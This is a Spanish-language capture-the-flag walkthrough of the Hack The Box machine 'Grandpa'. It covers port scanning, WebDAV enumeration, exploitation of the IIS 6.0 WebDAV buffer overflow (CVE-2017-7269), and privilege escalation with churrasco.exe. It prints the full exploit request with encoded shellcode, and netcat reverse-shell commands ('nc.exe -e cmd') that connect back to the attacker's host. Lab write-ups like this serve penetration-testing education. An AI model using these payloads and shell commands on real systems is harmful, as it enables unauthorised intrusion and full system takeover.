---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Grandpa

`Grandpa` es una de las máquinas más simples de Hack The Box, sin embargo, está cubierta por la vulnerabilidad CVE-2017-7269, ampliamente explotada. Esta vulnerabilidad es fácil de explotar y otorgó acceso inmediato a miles de servidores IIS en todo el mundo cuando se hizo pública.

<figure><img src="../../.gitbook/assets/Grandpa.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina Grandpa. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.14 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 05:22 CET
Initiating SYN Stealth Scan at 05:22
Scanning 10.10.10.14 [65535 ports]
Discovered open port 80/tcp on 10.10.10.14
SYN Stealth Scan Timing: About 23.73% done; ETC: 05:24 (0:01:40 remaining)
SYN Stealth Scan Timing: About 52.21% done; ETC: 05:24 (0:00:56 remaining)
Completed SYN Stealth Scan at 05:24, 105.67s elapsed (65535 total ports)
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.046s latency).
Scanned at 2025-01-26 05:22:22 CET for 106s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 105.78 seconds
           Raw packets sent: 131150 (5.771MB) | Rcvd: 133 (7.892KB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.14
	[*] Open ports: 80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado del escaneo con los scripts de **Nmap**, nos encontramos que está habilitado el `WebDAV` y los métodos que están permitidos, verificaremos este punto más adelante.

```bash
❯ nmap -sCV -p80 10.10.10.14 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 05:25 CET
Nmap scan report for 10.10.10.14
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Sun, 26 Jan 2025 04:26:00 GMT
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP (90%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (90%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows Server 2003 SP2 (89%), Microsoft Windows 2003 SP2 (88%), Microsoft Windows XP SP3 (88%), Microsoft Windows XP (85%), Microsoft Windows Server 2003 (85%), Microsoft Windows XP SP2 (85%), Microsoft Windows Server 2003 SP1 - SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   88.68 ms 10.10.16.1
2   88.96 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (266).png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Dado que en el escaneo inicial con **Nmap** nos encontramos que estaba el `WebDAV`, realizamos un escaneo sencillo a través de la herramienta de `davtest` que se encargará de realizar un escaneo de subir archivos para verificar que extensiones son válidas para subir a través del método `PUT` que se encontraba habilitado.

En el resultado obtenido, verificamos que no nos permite la subida con ninguna de esas extensones.

```bash
❯ davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: R3dGi7YWal
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	cgi	FAIL
PUT	asp	FAIL
PUT	aspx	FAIL
PUT	pl	FAIL
PUT	shtml	FAIL
PUT	php	FAIL
PUT	cfm	FAIL
PUT	html	FAIL
PUT	txt	FAIL
PUT	jsp	FAIL
PUT	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
```

Si en el escaneo de **Nmap** no nos huiera mostrado los métodos que se encuentran habilitados en el `WebDAV`, podemos realizar una solicitud con `cURL` para revisar la cabecera de la solicitud enviada.

```bash
❯ curl -s -X GET http://10.10.10.14 -I
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.14/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:2f4"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Sun, 26 Jan 2025 04:27:51 GMT
```

Accederemos a [http://10.10.10.14](http://10.10.10.14) y nos encontramos con la siguiente página que no nos muestra aparentemente nada. Realizamos fuzzing de directorios, subdominios y tampoco logramos encontrar nada interesante. Simplemente, podemos observar que se trata de un `IIS 6.0`.

<figure><img src="../../.gitbook/assets/imagen (267).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow \[RCE] (CVE-2017-7269) <a href="#microsoft-iis-6.0-webdav-scstoragepathfromurl-remote-buffer-overflow-rce-cve-2017-7269" id="microsoft-iis-6.0-webdav-scstoragepathfromurl-remote-buffer-overflow-rce-cve-2017-7269"></a>

Revisando vulnerabilidades del Web Server `IIS 6.0` nos encontramos con el siguiente exploit en Python.

```bash
❯ searchsploit IIS 6.0 | grep '.py'
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow        | windows/remote/41738.py
```

Revisando las vulnerabilidades, nos encontramos con el siguiente `CVE-2017-7269`.

{% hint style="danger" %}
Desbordamiento de búfer en la función ScStoragePathFromUrl en el servicio WebDAV en Internet Information Services (IIS) 6.0 en Microsoft Windows Server 2003 R2 permite a atacantes remotos ejecutar código arbitrario a través de una cabecera larga comenzando con "If:
{% endhint %}

Nos descargaremos el siguiente exploit de GitHub para realizar la explotación.

{% embed url="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269" %}

```bash
❯ wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
--2025-01-26 05:33:54--  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 12313 (12K) [text/plain]
Grabando a: «iis6 reverse shell»

iis6 reverse shell                                        100%[===================================================================================================================================>]  12,02K  --.-KB/s    en 0s      

2025-01-26 05:33:55 (71,0 MB/s) - «iis6 reverse shell» guardado [12313/12313]
```

Nos pondremos en escucha por un puerto para recibir la Reverse Shell del exploit.

```bash
❯ rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
```

Ejecutaremos el explooit indicándole el target (máquina victima) y el puerto en donde se encuentra el `IIS` expuesto, también informaremos nuestra dirección IP de atacante y el puerto en donde estamos en escucha.

```bash
❯ mv iis6\ reverse\ shell IIS6.py

❯ python2 IIS6.py 10.10.10.14 80 10.10.16.5 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

Verificaremos que hemos logrado obtener el acceso a la máquina objetivo.

```bash
❯ rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

## Privilege Escalation

### Token Kidnapping - Churrasco

Revisando los permisos que dispone el usuario actual `NT AUTHORITY\NETWORK SERVICE`, nos encontramos que dispone del privilegio de `SeImpersonatePrivilege`.

```powershell
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

Podríamos hacer uso de `JuicyPotato`, `PrintSpoofer`, etc, pero en este caso al tratarse de un equipo tan antiguo como es el `Windows Server 2003`, nos darían diversos problemas.

```powershell
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
```

Buscando por Internet como poder explotar este privilegio desde un `Windows Server 2003`, nos encontramos con el siguiente blog el cual mencionan un binario llamado `churrasco.exe` que hace una función similar a `JuicyPotato`.

{% embed url="https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/" %}

Nos descargaremos el binario en nuestro equipo y lo compartiremos a través de un servidor SMB.

```bash
❯ ls -l churrasco.exe
.rw-rw-r-- kali kali 30 KB Sun Jan 26 05:37:16 2025  churrasco.exe

❯ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Desde el equipo víctima, nos copiaremos el binario en una ruta que podamos ejeuctar el binario.

```powershell
C:\Temp>copy \\10.10.16.5\smbFolder\churrasco.exe C:\Temp\churrasco.exe
copy \\10.10.16.5\smbFolder\churrasco.exe C:\Temp\churrasco.exe
        1 file(s) copied.

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Temp

01/26/2025  06:38 AM    <DIR>          .
01/26/2025  06:38 AM    <DIR>          ..
01/26/2025  06:37 AM            31,232 churrasco.exe
               1 File(s)         31,232 bytes
               2 Dir(s)   1,318,244,352 bytes free
```

En una nueva terminal nos pondremos en escucha para recibir la Reverse Shell.

```bash
❯ rlwrap -cAr nc -nlvp 444
listening on [any] 444 ...
```

Desde nuestro equipo atacante, deberemos de disponer del binario `nc.exe` y levantar nuevamente un servidor SMB para compartir este otro binario.

```bash
❯ ls -l nc.exe
.rwxr-xr-x kali kali 28 KB Sun Jan 26 05:30:47 2025  nc.exe
❯ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Desde el equipo víctima, ejecutaremos dos veces el binario `churrasco.exe` indicándole que ejecute el binario que estamos compartiendo a través de un recurso compartido, al ejecutar el binario nos proporcionará una Reverse Shell.

```powershell
C:\Temp>churrasco.exe "\\10.10.16.5\smbFolder\nc.exe -e cmd 10.10.16.5 444"

C:\Temp>churrasco.exe "\\10.10.16.5\smbFolder\nc.exe -e cmd 10.10.16.5 444"
```

Verificamos que hemos logrado la conexión y que somos el usuario `NT AUTHORITY\SYSTEM`. Por otro lado, comprobamos que logramos visualizar las flags de **user.txt** y **root.txt**.

```powershell
❯ rlwrap -cAr nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.14] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
9359e905a**********************

C:\Documents and Settings\Administrator\Desktop>type "C:\Documents and Settings\Harry\Desktop\user.txt"
type "C:\Documents and Settings\Harry\Desktop\user.txt"
bdff5ec67c**********************
```
